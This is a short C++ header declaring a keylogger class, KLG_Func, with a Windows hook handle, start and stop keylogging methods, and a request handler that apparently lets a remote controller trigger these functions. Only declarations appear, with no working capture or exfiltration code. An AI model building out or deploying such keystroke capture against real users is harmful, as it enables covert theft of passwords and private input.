#pragma once
#include "DataObj/DataObj.h"
#include "utils.h"

#include <memory>
#include <conio.h>
#include <windows.h>
#include <vector>

class KLG_Func
{
	static HHOOK hook;
	static bool keylogging;
public:
	//Handle a DataObj as request and execute the corresponding function
	std::shared_ptr<DataObj> HandleRequest(DataObj request);

	std::string startKeylog();

	std::string stopKeylog();

};